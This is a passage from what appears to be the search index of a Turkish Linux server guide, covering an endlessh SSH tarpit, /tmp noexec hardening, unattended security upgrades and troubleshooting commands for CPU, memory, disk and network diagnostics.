kal\u0131r. Ba\u015fka sunuculara sald\u0131ramaz.</li> </ul>"},{"location":"security/tarpit/#docker-compose-ile-kurulum","title":"Docker Compose ile Kurulum","text":"<p><code>docker run</code> yerine y\u00f6netimi kolay olan Compose kullanal\u0131m.</p> <ol> <li>Klas\u00f6r olu\u015fturun: <code>mkdir -p ~/endlessh &amp;&amp; cd ~/endlessh</code></li> <li><code>docker-compose.yml</code> dosyas\u0131 olu\u015fturun:</li> </ol> <pre><code>version: \"3.8\"\n\nservices:\n  endlessh:\n    image: stored/endlessh:latest\n    container_name: endlessh\n    restart: unless-stopped\n    ports:\n      # Host Port 22 -&gt; Container Port 2222\n      # (Ger\u00e7ek SSH'\u0131n\u0131z\u0131 2222 gibi ba\u015fka bir porta ald\u0131\u011f\u0131n\u0131zdan emin olun!)\n      - \"22:2222\"\n    environment:\n      # Her karakter aras\u0131 bekleme s\u00fcresi (milisaniye)\n      - MS_DELAY=10000\n      # Ayn\u0131 anda tuza\u011fa d\u00fc\u015f\u00fcr\u00fclebilecek maksimum bot say\u0131s\u0131\n      - MAX_CLIENTS=4096\n      # Log seviyesi (0=Sessiz, 1=Standart, 2=Debug)\n      - LOG_LEVEL=1\n      # Banner sat\u0131r uzunlu\u011fu\n      - MAX_LINE_LENGTH=32\n    # G\u00fcvenlik: Read-only dosya sistemi\n    read_only: true\n    cap_drop:\n      - ALL\n</code></pre>"},{"location":"security/tarpit/#baslatma","title":"Ba\u015flatma","text":"<pre><code>docker compose up -d\n</code></pre>"},{"location":"security/tarpit/#izleme-ve-istatistikler","title":"\u0130zleme ve \u0130statistikler \ud83d\udcca","text":"<p>Botlar\u0131n nas\u0131l tuza\u011fa d\u00fc\u015ft\u00fc\u011f\u00fcn\u00fc izlemek keyiflidir.</p> <p>Canl\u0131 Loglar:</p> <pre><code>docker logs -f endlessh\n</code></pre> <p>\u00c7\u0131kt\u0131 \u00d6rne\u011fi:</p> <pre><code>OPEN: host=103.21.55.2 port=54321 fd=4 n=1/4096\n... (10 dakika sonra) ...\nCLOSE: host=103.21.55.2 port=54321 fd=4 n=0/4096 time=600.000\n</code></pre> <ul> <li><code>OPEN</code>: Bot tuza\u011fa d\u00fc\u015ft\u00fc.</li> <li><code>time=600.000</code>: Bot tam 600 saniye (10 dakika) boyunca bo\u015funa beklemi\u015f!</li> </ul> <p>\u0130statistik \u00c7\u0131karma: Ka\u00e7 farkl\u0131 IP adresini tuza\u011fa d\u00fc\u015f\u00fcrd\u00fck?</p> <pre><code>docker logs endlessh 2&gt;&amp;1 | grep \"OPEN\" | awk '{print $2}' | cut -d= -f2 | sort | uniq -c | sort -nr | head -10\n</code></pre>"},{"location":"security/tarpit/#neden-endlessh","title":"Neden Endlessh?","text":"<ul> <li>S\u0131f\u0131r Kaynak: Neredeyse 0 CPU ve RAM harcar (Go veya C ile yaz\u0131lm\u0131\u015ft\u0131r).</li> <li>\u0130ntikam: Sizi tarayan botlar\u0131n zaman\u0131n\u0131 \u00e7alarak interneti (birazc\u0131k) temizlemi\u015f olursunuz.</li> </ul> <p>[!WARNING] &gt; Firewall Ayar\u0131: Honeypot kurduktan sonra UFW veya Cloud Security List'te Port 22'yi a\u00e7mal\u0131s\u0131n\u0131z ki botlar tuza\u011fa d\u00fc\u015fs\u00fcn! (Kendi ger\u00e7ek SSH'\u0131n\u0131z\u0131n ba\u015fka portta oldu\u011fundan emin olun).</p>"},{"location":"security/tmp-hardening/","title":"/tmp Klas\u00f6r\u00fc G\u00fcvenli\u011fi (Noexec) \ud83d\udee1\ufe0f","text":"<p>Linux sunucularda <code>/tmp</code> klas\u00f6r\u00fc, ge\u00e7ici dosyalar i\u00e7in kullan\u0131l\u0131r ve d\u00fcnyadaki her kullan\u0131c\u0131 buraya yazabilir (<code>rwxrwxrwt</code>). Bu \u00f6zellik, sald\u0131rganlar\u0131n zararl\u0131 scriptlerini (exploit, shell script, vir\u00fcs) buraya indirip \u00e7al\u0131\u015ft\u0131rmas\u0131 i\u00e7in m\u00fckemmel bir yuvad\u0131r.</p> <p>Bu a\u00e7\u0131\u011f\u0131 kapatmak i\u00e7in <code>/tmp</code> klas\u00f6r\u00fcn\u00fc noexec (i\u00e7inde hi\u00e7bir \u015fey \u00e7al\u0131\u015ft\u0131r\u0131lamaz) moduyla ba\u011flayaca\u011f\u0131z.</p> <p>Ama\u00e7: Sald\u0131rgan <code>/tmp</code> i\u00e7ine vir\u00fcs indirse bile <code>./virus</code> diyerek \u00e7al\u0131\u015ft\u0131ramas\u0131n.</p>"},{"location":"security/tmp-hardening/#1-hazrlk-ve-yedek","title":"1. Haz\u0131rl\u0131k ve Yedek","text":"<p><code>fstab</code> dosyas\u0131 sunucunun a\u00e7\u0131l\u0131\u015f\u0131nda diskleri ba\u011flar. Yanl\u0131\u015f bir harf, sunucunun a\u00e7\u0131lmamas\u0131na neden olabilir. \u00d6nce yedek alal\u0131m!</p> <pre><code>sudo cp /etc/fstab /etc/fstab.bak\n</code></pre>"},{"location":"security/tmp-hardening/#2-tmpyi-guvenli-baglama-tmpfs","title":"2. /tmp'yi G\u00fcvenli Ba\u011flama (Tmpfs)","text":"<p>Bu i\u015flem <code>/tmp</code> klas\u00f6r\u00fcn\u00fc RAM \u00fczerinde (tmpfs) tutar ve \u00e7al\u0131\u015ft\u0131r\u0131labilir dosyalar\u0131 engeller.</p> <p>Dosyay\u0131 a\u00e7\u0131n:</p> <pre><code>sudo nano /etc/fstab\n</code></pre> <p>En alt sat\u0131ra \u015funu ekleyin:</p> <pre><code># Secure /tmp (noexec prevents running scripts)\ntmpfs /tmp tmpfs defaults,noexec,nosuid,nodev 0 0\n</code></pre> <ul> <li>noexec: Script/program \u00e7al\u0131\u015ft\u0131r\u0131lamaz.</li> <li>nosuid: Root yetkisi alan dosya bar\u0131namaz.</li> <li>nodev: Ayg\u0131t dosyas\u0131 (device file) olu\u015fturulamaz.</li> </ul>"},{"location":"security/tmp-hardening/#3-ayarlar-uygulama","title":"3. Ayarlar\u0131 Uygulama","text":"<p>Kaydettikten sonra (Ctrl+O, Enter, Ctrl+X), ayarlar\u0131 aktif etmek i\u00e7in:</p> <pre><code># De\u011fi\u015fiklikleri uygula\nsudo mount -o remount /tmp || sudo mount -a\n</code></pre> <p>Not: E\u011fer hata al\u0131rsan\u0131z veya \"busy\" derse sunucuyu yeniden ba\u015flatman\u0131z gerekebilir (<code>reboot</code>).</p>"},{"location":"security/tmp-hardening/#4-dogrulama-hacker-testi","title":"4. Do\u011frulama (Hacker Testi) \ud83e\uddea","text":"<p>Ger\u00e7ekten \u00e7al\u0131\u015f\u0131p \u00e7al\u0131\u015fmad\u0131\u011f\u0131n\u0131 test edelim. <code>/tmp</code> i\u00e7ine basit bir script yaz\u0131p \u00e7al\u0131\u015ft\u0131rmay\u0131 deneyelim.</p> <pre><code># 1. /tmp'ye git\ncd /tmp\n\n# 2. Masum bir script olu\u015ftur\necho 'echo \"E\u011fer bunu g\u00f6r\u00fcyorsan G\u00dcVENL\u0130K YOK!\"' &gt; test_hack.sh\n\n# 3. \u00c7al\u0131\u015ft\u0131rma izni ver\nchmod +x test_hack.sh\n\n# 4. \u00c7al\u0131\u015ft\u0131rmay\u0131 dene\n./test_hack.sh\n</code></pre> <p>Beklenen Sonu\u00e7:</p> <pre><code>-bash: ./test_hack.sh: Permission denied\n# Veya\nEri\u015fim engellendi\n</code></pre> <p>E\u011fer \"Permission denied\" hatas\u0131 al\u0131yorsan\u0131z tebrikler! \ud83c\udf89 Sald\u0131rganlar art\u0131k <code>/tmp</code> \u00fczerinden script \u00e7al\u0131\u015ft\u0131ramaz.</p>"},{"location":"security/tmp-hardening/#onemli-uyar-apt-ve-scriptler","title":"\u26a0\ufe0f \u00d6nemli Uyar\u0131: Apt ve Scriptler","text":"<p>Baz\u0131 k\u00f6t\u00fc yaz\u0131lm\u0131\u015f scriptler veya g\u00fcncellemeler <code>/tmp</code> i\u00e7inde \u00e7al\u0131\u015fmak isteyebilir (Nadir). E\u011fer bir g\u00fcncelleme s\u0131ras\u0131nda sorun ya\u015farsan\u0131z ge\u00e7ici olarak korumay\u0131 kald\u0131rabilirsiniz:</p> <pre><code># Korumay\u0131 kald\u0131r (exec izni ver)\nsudo mount -o remount,exec /tmp\n\n# \u0130\u015fini hallet, g\u00fcncellemeyi yap...\n\n# Korumay\u0131 geri a\u00e7\nsudo mount -o remount,noexec /tmp\n</code></pre>"},{"location":"security/updates/","title":"Otomatik G\u00fcvenlik G\u00fcncellemeleri","text":"<p>Sunucunuzun g\u00fcvenli\u011fi i\u00e7in en kritik ad\u0131m, g\u00fcvenlik yamalar\u0131n\u0131 zaman\u0131nda almakt\u0131r. Unattended Upgrades, bu i\u015fi sizin yerinize sessizce halleder.</p>"},{"location":"security/updates/#1-kurulum","title":"1. Kurulum","text":"<p>Paketi kurun:</p> <pre><code>sudo apt update\nsudo apt install -y unattended-upgrades apt-listchanges\n</code></pre>"},{"location":"security/updates/#2-aktiflestirme-otomatiklestirme","title":"2. Aktifle\u015ftirme (Otomatikle\u015ftirme)","text":"<p>\u00c7o\u011fu rehber <code>dpkg-reconfigure</code> kullan\u0131r ama bu interaktiftir (otomasyona gelmez). Biz do\u011frudan ayar dosyas\u0131n\u0131 olu\u015fturaca\u011f\u0131z.</p> <p>\u015eu dosyay\u0131 olu\u015fturun/d\u00fczenleyin: <code>/etc/apt/apt.conf.d/20auto-upgrades</code></p> <pre><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades\n</code></pre> <p>\u0130\u00e7eri\u011fi \u015f\u00f6yle olmal\u0131:</p> <pre><code>APT::Periodic::Update-Package-Lists \"1\";\nAPT::Periodic::Unattended-Upgrade \"1\";\nAPT::Periodic::AutocleanInterval \"7\";\n</code></pre> <ul> <li>Update-Package-Lists \"1\": Her g\u00fcn paket listesini g\u00fcncelle (<code>apt update</code>).</li> <li>Unattended-Upgrade \"1\": Her g\u00fcn g\u00fcncellemeleri kur (<code>apt upgrade</code>).</li> <li>AutocleanInterval \"7\": 7 g\u00fcnde bir \u00f6nbelle\u011fi temizle.</li> </ul>"},{"location":"security/updates/#3-konfigurasyon-zamanlama-ve-reboot","title":"3. Konfig\u00fcrasyon (Zamanlama ve Reboot)","text":"<p>Ana ayarlar <code>/etc/apt/apt.conf.d/50unattended-upgrades</code> dosyas\u0131ndad\u0131r. Buras\u0131 \"Neleri g\u00fcncelleyeyim?\" ve \"Reboot edeyim mi?\" sorular\u0131n\u0131n cevab\u0131d\u0131r.</p> <p>Dosyay\u0131 a\u00e7\u0131n:</p> <pre><code>sudo nano /etc/apt/apt.conf.d/50unattended-upgrades\n</code></pre> <p>Bu dosyada \u00e7o\u011fu ayar <code>//</code> ile yorum sat\u0131r\u0131 halindedir. A\u015fa\u011f\u0131daki ad\u0131mlar\u0131 izleyin:</p> <ol> <li> <p>Allowed-Origins (Kontrol Edin):     Genelde varsay\u0131lan olarak a\u00e7\u0131kt\u0131r. <code>${distro_id}:${distro_codename}-security</code> sat\u0131r\u0131n\u0131n ba\u015f\u0131nda <code>//</code> olmad\u0131\u011f\u0131ndan emin olun.</p> <pre><code>Unattended-Upgrade::Allowed-Origins {\n    \"${distro_id}:${distro_codename}-security\";\n};\n</code></pre> </li> <li> <p>Temizlik ve Reboot (Aktif Hale Getirin):     Bu sat\u0131rlar varsay\u0131lan olarak kapal\u0131d\u0131r (<code>//</code> ile ba\u015flar). Ba\u015f\u0131ndaki <code>//</code> i\u015faretlerini silerek a\u00e7\u0131n:</p> <pre><code>// Gereksiz kernel ve ba\u011f\u0131ml\u0131l\u0131klar\u0131 temizle\nUnattended-Upgrade::Remove-Unused-Kernel-Packages \"true\";\nUnattended-Upgrade::Remove-Unused-Dependencies \"true\";\n\n// Otomatik Yeniden Ba\u015flatma\nUnattended-Upgrade::Automatic-Reboot \"true\";\nUnattended-Upgrade::Automatic-Reboot-Time \"04:00\";\n</code></pre> </li> </ol> <p>[!WARNING] &gt; Automatic Reboot: Kernel g\u00fcncellemeleri yeniden ba\u015flatma gerektirir. E\u011fer bunu a\u00e7arsan\u0131z, sunucunuz gece 04:00'te kapan\u0131p a\u00e7\u0131labilir. Docker konteynerlerinizin <code>restart: always</code> modunda oldu\u011fundan emin olun!</p>"},{"location":"security/updates/#4-ileri-duzey-ayarlar","title":"4. \u0130leri D\u00fczey Ayarlar","text":""},{"location":"security/updates/#paket-engelleme-blacklist","title":"Paket Engelleme (Blacklist)","text":"<p>Bazen bir g\u00fcncelleme sisteminizi bozabilir (\u00f6rn: Nginx konfig\u00fcrasyonu de\u011fi\u015febilir). O paketi g\u00fcncellemelerden hari\u00e7 tutmak i\u00e7in <code>Package-Blacklist</code> k\u0131sm\u0131n\u0131 kullan\u0131n.</p> <p><code>/etc/apt/apt.conf.d/50unattended-upgrades</code> dosyas\u0131nda:</p> <pre><code>Unattended-Upgrade::Package-Blacklist {\n    \"nginx\";\n    \"libc6\";\n    \"libc6-dev\";\n    // Regex de kullanabilirsiniz:\n    // \"linux-image.*\";\n};\n</code></pre>"},{"location":"security/updates/#diger-depolar-docker-nginx-dahil-etme","title":"Di\u011fer Depolar\u0131 (Docker, Nginx) Dahil Etme","text":"<p>Varsay\u0131lan olarak sadece Ubuntu g\u00fcvenlik yamalar\u0131 al\u0131n\u0131r. E\u011fer Docker veya Nginx gibi d\u0131\u015f kaynaklardan kurdu\u011funuz paketlerin de g\u00fcncellenmesini istiyorsan\u0131z <code>Allowed-Origins</code> k\u0131sm\u0131na ekleme yapmal\u0131s\u0131n\u0131z.</p> <p>Ancak bu biraz karma\u015f\u0131kt\u0131r (<code>origin</code> ve <code>suite</code> de\u011ferlerini bilmeniz gerekir). Genelde g\u00fcvenlik i\u00e7in sadece temel OS g\u00fcncellemelerini a\u00e7\u0131k tutmak ve uygulama g\u00fcncellemelerini (Docker gibi) manuel yapmak daha g\u00fcvenlidir.</p>"},{"location":"security/updates/#e-posta-bildirimi","title":"E-Posta Bildirimi","text":"<p>G\u00fcncellemelerden haberdar olmak isterseniz (mailx veya postfix gerekir):</p> <pre><code>Unattended-Upgrade::Mail \"admin@example.com\";\nUnattended-Upgrade::MailReport \"on-change\"; // Sadece g\u00fcncelleme olursa yaz\n</code></pre>"},{"location":"security/updates/#5-test-etme-dry-run","title":"5. Test Etme (Dry Run)","text":"<p>Yapt\u0131\u011f\u0131m\u0131z ayarlar \u00e7al\u0131\u015f\u0131yor mu? Sim\u00fclasyon yapal\u0131m:</p> <pre><code>sudo unattended-upgrades --dry-run --debug\n</code></pre> <p>Komutun sonunda <code>Checking (veya Installing)...</code> gibi \u00e7\u0131kt\u0131lar g\u00f6r\u00fcyorsan\u0131z sistem \u00e7al\u0131\u015f\u0131yor demektir.</p>"},{"location":"security/updates/#6-loglar-izleme","title":"6. Loglar\u0131 \u0130zleme","text":"<p>Ger\u00e7ekten g\u00fcncelleme yap\u0131p yapmad\u0131\u011f\u0131n\u0131 loglardan takip edebilirsiniz:</p> <pre><code># Ana log dosyas\u0131\ncat /var/log/unattended-upgrades/unattended-upgrades.log\n\n# Son ger\u00e7ekle\u015fen i\u015flemler\ntail -f /var/log/unattended-upgrades/unattended-upgrades.log\n</code></pre>"},{"location":"security/updates/#7-servis-durumu","title":"7. Servis Durumu","text":"<p>Bu i\u015flem bir \"Systemd Timer\" ile tetiklenir. \u00c7al\u0131\u015ft\u0131\u011f\u0131n\u0131 teyit edelim:</p> <pre><code>systemctl status apt-daily-upgrade.timer\n</code></pre> <p>\u00c7\u0131kt\u0131da <code>Active: active (waiting)</code> g\u00f6rmelisiniz.</p>"},{"location":"security/updates/#8-guncelleme-bildirimleri-motd","title":"8. G\u00fcncelleme Bildirimleri (MOTD) \ud83d\udce2","text":"<p>SSH ile sunucuya giri\u015f yapt\u0131\u011f\u0131n\u0131zda kar\u015f\u0131n\u0131za \u00e7\u0131kan \"3 updates can be applied immediately\" yaz\u0131s\u0131n\u0131 sa\u011flayan ara\u00e7 <code>update-notifier-common</code> paketidir.</p>"},{"location":"security/updates/#kontrol-etme","title":"Kontrol Etme","text":"<p>Sisteminizde y\u00fckl\u00fc de\u011filse (Ubuntu Minimal s\u00fcr\u00fcmlerde olmayabilir):</p> <pre><code>apt list --installed update-notifier-common\n</code></pre> <p>Y\u00fckl\u00fc de\u011filse kurun:</p> <pre><code>sudo apt install update-notifier-common\n</code></pre>"},{"location":"security/updates/#nasl-calsr","title":"Nas\u0131l \u00c7al\u0131\u015f\u0131r?","text":"<p>Bu ara\u00e7 <code>/var/lib/update-notifier/updates-available</code> ad\u0131nda bir dosyay\u0131 g\u00fcnceller. SSH giri\u015finde (PAM mod\u00fcl\u00fc) bu dosya okunur ve size mesaj olarak g\u00f6sterilir.</p> <p>E\u011fer mesaj\u0131n g\u00fcncel olmad\u0131\u011f\u0131n\u0131 d\u00fc\u015f\u00fcn\u00fcyorsan\u0131z, manuel olarak tetikleyebilirsiniz:</p> <pre><code>/usr/lib/update-notifier/update-motd-updates-available\n</code></pre>"},{"location":"troubleshooting/","title":"Metodolojik Sorun Giderme \ud83d\udd75\ufe0f\u200d\u2642\ufe0f","text":"<p>Bir sorun an\u0131nda (Incident) rastgele komutlar yazmak (<code>reboot</code>, <code>systemctl restart</code>) amat\u00f6rl\u00fckt\u00fcr. Senior bir m\u00fchendis bilimsel y\u00f6ntem izler.</p> <p>Bu b\u00f6l\u00fcmde, Google SRE ve Netflix m\u00fchendislerinin kulland\u0131\u011f\u0131 iki temel metodolojiyi esas alaca\u011f\u0131z.</p>"},{"location":"troubleshooting/#1-the-use-method-kaynak-analizi","title":"1. The USE Method (Kaynak Analizi) \ud83e\uddf1","text":"<p>Donan\u0131m ve i\u015fletim sistemi kaynaklar\u0131n\u0131 analiz etmek i\u00e7in Brendan Gregg taraf\u0131ndan geli\u015ftirilmi\u015ftir. Her kaynak i\u00e7in 3 soruyu sorar\u0131z:</p> <ul> <li>Utilization (Kullan\u0131m): Kaynak ne kadar me\u015fgul? (%100 dolu mu?)</li> <li>Saturation (Doygunluk): Bekleyen i\u015f var m\u0131? (Kuyruk olu\u015ftu mu?)</li> <li>Errors (Hatalar): Hata \u00fcretiliyor mu?</li> </ul> Kaynak Utilization Saturation Errors CPU <code>mpstat -P ALL 1</code> <code>vmstat 1</code> (r &gt; cpu count) <code>perf</code>, <code>dmesg</code> RAM <code>free -m</code> <code>vmstat 1</code> (si/so - swap) <code>dmesg</code> (OOM Kill) Disk <code>iostat -x 1</code> (%util) <code>iostat -x 1</code> (avgqu-sz &gt; 1) <code>dmesg</code> (IO Error) Network <code>sar -n DEV 1</code> <code>ip -s link</code> (dropped) <code>ip -s link</code> (errors)"},{"location":"troubleshooting/#2-the-red-method-servis-analizi","title":"2. The RED Method (Servis Analizi) \ud83d\udea6","text":"<p>Mikroservisler ve uygulamalar i\u00e7in Tom Wilkie taraf\u0131ndan geli\u015ftirilmi\u015ftir. Kullan\u0131c\u0131 deneyimine odaklan\u0131r.</p> <ul> <li>Rate (H\u0131z): Saniyede gelen istek say\u0131s\u0131 (RPS).</li> <li>Errors (Hatalar): Ba\u015far\u0131s\u0131z isteklerin oran\u0131 (HTTP 500).</li> <li>Duration (S\u00fcre): \u0130steklerin cevaplanma s\u00fcresi (Latency - p99).</li> </ul> <p>[!TIP] &gt; \u00d6nce RED, Sonra USE: Bir sorun oldu\u011funda \u00f6nce RED ile \"Kullan\u0131c\u0131 etkileniyor mu?\" diye bak\u0131n. E\u011fer etkileniyorsa, USE ile \"Hangi kaynak darbo\u011fazda?\" sorusunu cevaplay\u0131n.</p>"},{"location":"troubleshooting/#3-bilimsel-yaklasm-dongusu","title":"3. Bilimsel Yakla\u015f\u0131m D\u00f6ng\u00fcs\u00fc \ud83d\udd2c","text":"<ol> <li>G\u00f6zlem: \"Site yava\u015f\" (Vague) -&gt; \"Latency p99 2 saniyeye \u00e7\u0131kt\u0131\" (Specific).</li> <li>Hipotez: \"Database CPU'su \u015fi\u015fmi\u015f olabilir.\"</li> <li>Test: Database CPU metriklerine bak.</li> <li>Kan\u0131t: Evet, CPU %100. Veya Hay\u0131r, %10.</li> <li>Aksiyon: Hipotez do\u011fruysa \u00e7\u00f6z\u00fcm uygula, yanl\u0131\u015fsa 2. ad\u0131ma d\u00f6n.</li> </ol>"},{"location":"troubleshooting/cheat-sheet/","title":"Advanced Cheat Sheet (Senior SRE) \ud83d\udee0\ufe0f","text":"<p><code>top</code> komutundan fazlas\u0131na ihtiyac\u0131n\u0131z oldu\u011funda.</p>"},{"location":"troubleshooting/cheat-sheet/#cpu-process-forensics","title":"\ud83e\udde0 CPU &amp; Process Forensics","text":"Senaryo Senior Komut A\u00e7\u0131klama Process ne yap\u0131yor? <code>strace -p &lt;PID&gt; -f -e trace=file,network</code> Program\u0131n kernel ile konu\u015fmas\u0131n\u0131 izle. Dosya a\u00e7\u0131yor mu? A\u011f iste\u011fi at\u0131yor mu? Core da\u011f\u0131l\u0131m\u0131 <code>mpstat -P ALL 1</code> Tek bir \u00e7ekirdek mi %100 yoksa hepsi mi dengeli? Process a\u011fac\u0131 <code>ps fax</code> Hiyerar\u015fik process g\u00f6r\u00fcn\u00fcm\u00fc (Zombie'nin babas\u0131n\u0131 bulmak i\u00e7in). IO Bekleyenler <code>vmstat 1</code> <code>b</code> (blocked) s\u00fctunu y\u00fcksekse CPU de\u011fil, Disk sorunu vard\u0131r."},{"location":"troubleshooting/cheat-sheet/#memory-forensics","title":"\ud83d\udcbe Memory Forensics","text":"<p>| Senaryo            | Senior Komut                                | A\u00e7\u0131klama                                                                                          | | :----------------- | :------------------------------------------ | :------------------------------------------------------------------------------------------------ | ------------------------------ | | Kim RAM yiyor? | <code>ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -10</code>                                                                                         | En \u00e7ok RAM t\u00fcketenleri s\u0131rala. | | Swap kullan\u0131m\u0131 | <code>vmstat 1</code>                                  | <code>si</code> (swap in) ve <code>so</code> (swap out) &gt; 0 ise sistem RAM yetmezli\u011finden can \u00e7eki\u015fiyordur.             | | Cache analizi  | <code>free -h</code>                                   | <code>buff/cache</code> y\u00fcksekse korkma, Linux RAM bo\u015f kalmas\u0131n diye kullan\u0131yordur. \u00d6nemli olan <code>available</code>. |</p>"},{"location":"troubleshooting/cheat-sheet/#network-forensics","title":"\ud83c\udf10 Network Forensics","text":"<p>| Senaryo                | Senior Komut                       | A\u00e7\u0131klama                                                                | | :--------------------- | :--------------------------------- | :---------------------------------------------------------------------- | ------------------------------------ | | Paket Analizi      | <code>tcpdump -nni eth0 port 80 -A -s0</code> | HTTP paketlerinin i\u00e7eri\u011fini (Body/Header) canl\u0131 izle. <code>-A</code> ASCII basar. | | Portu kim tutuyor? | <code>ss -tulpn                         | grep :80</code>                                                               | <code>netstat</code> yerine modern <code>ss</code> kullan. | | DNS Sorunu         | <code>dig +trace google.com</code>            | DNS sorgusunu root serverlardan ba\u015flayarak ad\u0131m ad\u0131m izle.              | | Detayl\u0131 Trace      | <code>mtr -zbwc 100 8.8.8.8</code>            | Hangi hop'ta paket kayb\u0131 var? (Ping + Traceroute kombosu).              | | A\u00e7\u0131k Dosyalar      | <code>lsof -iTCP -sTCP:ESTABLISHED</code>     | Sadece kurulu (established) TCP ba\u011flant\u0131lar\u0131n\u0131 d\u00f6k.                     |</p>"},{"location":"troubleshooting/cheat-sheet/#disk-io-forensics","title":"\ud83d\udcbf Disk &amp; IO Forensics","text":"<p>| Senaryo                    | Senior Komut           | A\u00e7\u0131klama                                                                   | | :------------------------- | :--------------------- | :------------------------------------------------------------------------- | ---------------------------- | | Anl\u0131k IO               | <code>iostat -xz 1</code>         | <code>%util</code> %100'e yak\u0131nsa disk darbo\u011fazdad\u0131r. <code>await</code> s\u00fcresi tepki s\u00fcresidir. | | Hangi process yaz\u0131yor? | <code>iotop -oPa</code>           | Diski yoran su\u00e7u process bazl\u0131 bul.                                        | | B\u00fcy\u00fck dosyalar         | <code>du -h --max-depth=1 / | sort -hr</code>                                                                  | Klas\u00f6r klas\u00f6r boyut analizi. | | Inode bitmi\u015f mi?       | <code>df -i</code>                | Disk bo\u015fta olsa bile Inode biterse dosya yazamazs\u0131n.                       |</p>"},{"location":"troubleshooting/cheat-sheet/#kernel-logs","title":"\ud83d\udea8 Kernel &amp; Logs","text":"<pre><code># OOM Killer (RAM bitince kimi \u00f6ld\u00fcrd\u00fc?)\ndmesg -T | grep -i \"kill\"\n\n# Son 10 dakika i\u00e7inde olan kritik hatalar\njournalctl -p 3 -xb --since \"10 minutes ago\"\n\n# Dosya kim taraf\u0131ndan silindi? (Auditd kuruluysa)\nausearch -f /etc/passwd\n</code></pre>"},{"location":"troubleshooting/common-issues/","title":"Yaygin Sorunlar","text":""},{"location":"troubleshooting/common-issues/#ssh-baglanti-sorunu","title":"SSH baglanti sorunu","text":"<ul> <li>IP, DNS ve firewall kurallarini kontrol et.</li> <li><code>sshd_config</code> degisikliklerini geri al (gerekirse).</li> <li>Loglar: <code>journalctl -u ssh</code></li> <li>Detayli akisin tamami icin: SSH Lockout</li> </ul>"},{"location":"troubleshooting/common-issues/#servis-ayakta-degil","title":"Servis ayakta degil","text":"<ul> <li>Hizli kontrol: servis durumu, loglar, port dinleme.</li> <li>Detayli akisin tamami icin: Servis Kesintisi</li> </ul>"},{"location":"troubleshooting/common-issues/#nginx-502","title":"Nginx 502","text":"<ul> <li>Uygulama portu dinliyor mu?</li> <li>Reverse proxy upstream dogru mu?</li> <li>Loglar: <code>/var/log/nginx/error.log</code></li> <li>Detayli akisin tamami icin: Servis Kesintisi</li> </ul>"},{"location":"troubleshooting/common-issues/#disk-dolu","title":"Disk dolu","text":"<ul> <li>Disk ve log hizli kontrol.</li> <li>Detayli akisin tamami icin: Disk Dolu Mudahalesi</li> </ul>"},{"location":"troubleshooting/common-issues/#tls-sertifikasi-yenilenmiyor","title":"TLS sertifikasi yenilenmiyor","text":"<ul> <li>Certbot timer ve loglari kontrol et.</li> <li>Detayli akisin tamami icin: TLS Yenileme Sorunu</li> </ul>"},{"location":"troubleshooting/common-issues/#dogrulama","title":"Dogrulama","text":"<ul> <li>Sorun tekrarliyor mu?</li> <li>Loglar temiz mi?</li> </ul>"},{"location":"troubleshooting/network/","title":"Network Forensics \ud83c\udf10","text":"<p>A\u011f sorunlar\u0131 genellikle \"yava\u015fl\u0131k\" olarak rapor edilir. Sorunun sunucuda m\u0131, arada (ISP) m\u0131 yoksa kar\u015f\u0131 tarafta m\u0131 oldu\u011funu anlamak sanatt\u0131r.</p>"},{"location":"troubleshooting/network/#1-latency-vs-bandwidth-vs","title":"1. Latency vs Bandwidth \ud83d\udc22 vs \ud83c\udfce\ufe0f","text":"<ul> <li>Bandwidth (Bant Geni\u015fli\u011fi): Borunun geni\u015fli\u011fi. (1 Gbps)</li> <li>Latency (Gecikme): Verinin borudan ge\u00e7i\u015f s\u00fcresi. (20ms)</li> </ul> <p>Kural: Web sitelerinin yava\u015f a\u00e7\u0131lmas\u0131n\u0131n sebebi %90 Latency sorunudur, Bandwidth de\u011fil.</p> <p>Te\u015fhis: <code>mtr</code> (My Traceroute) kullan\u0131n. Ping ve Traceroute'un birle\u015fimidir.</p> <pre><code>mtr -zbwc 100 8.8.8.8\n</code></pre> <ul> <li>Paket kayb\u0131 (Loss%) nerede ba\u015fl\u0131yor? \u0130lk hopta ise sorun sizde/kablonuzda. Ortada ise ISP sorunu.</li> </ul>"},{"location":"troubleshooting/network/#2-dns-cozumleme-sorunlar","title":"2. DNS \u00c7\u00f6z\u00fcmleme Sorunlar\u0131 \ud83d\uddfa\ufe0f","text":"<p>\"Siteye girilmiyor\" demeden \u00f6nce \"Adres \u00e7\u00f6z\u00fcl\u00fcyor mu?\" diye bak\u0131n.</p> <p>Basit Test:</p> <pre><code>host google.com\n</code></pre> <p>Detayl\u0131 Analiz (Trace): DNS sorgusunun k\u00f6k sunuculardan (Root Servers) ba\u015flayarak ad\u0131m ad\u0131m nas\u0131l \u00e7\u00f6z\u00fcld\u00fc\u011f\u00fcn\u00fc izleyin:</p> <pre><code>dig +trace google.com\n</code></pre> <p>Systemd-resolve Sorunlar\u0131: Ubuntu/Debian'da DNS cache sorunlar\u0131 i\u00e7in:</p> <pre><code>resolvectl status\nresolvectl flush-caches\n</code></pre>"},{"location":"troubleshooting/network/#3-tcpdump-ile-paket-yakalama","title":"3. Tcpdump ile Paket Yakalama \ud83c\udfa3","text":"<p>Sorunu loglarda g\u00f6remiyorsan\u0131z, kabloyu dinleyin.</p> <p>\u00d6rnek: HTTP 500 d\u00f6n\u00fcyor ama log yok 80 portunu dinle, ASCII format\u0131nda (-A) bas, paketleri kesme (-s0):</p> <pre><code>tcpdump -i eth0 port 80 -A -s0\n</code></pre> <p>\u00d6rnek: Kim bana SSH brute-force yap\u0131yor? Sadece SYN paketlerini (ba\u011flant\u0131 kurma iste\u011fi) yakala:</p> <pre><code>tcpdump -i eth0 port 22 \"tcp[tcpflags] &amp; tcp-syn != 0\"\n</code></pre> <p>[!TIP] &gt; <code>tcpdump</code> \u00e7\u0131kt\u0131s\u0131n\u0131 okumak zordur. <code>-w capture.pcap</code> ile dosyaya kaydedip, dosyay\u0131 bilgisayar\u0131n\u0131za indirip Wireshark ile g\u00f6rsel olarak inceleyebilirsiniz.</p>"},{"location":"troubleshooting/performance/","title":"Performans Forensics \ud83d\udd2c","text":"<p>Sistem yava\u015f ama neden? CPU mu, Disk mi, yoksa Kernel kilitlenmesi mi? Ezbere konu\u015fmayal\u0131m, kan\u0131tlara bakal\u0131m.</p>"},{"location":"troubleshooting/performance/#1-load-average-yalan","title":"1. Load Average Yalan\u0131","text":"<p><code>uptime</code> yazd\u0131\u011f\u0131n\u0131zda 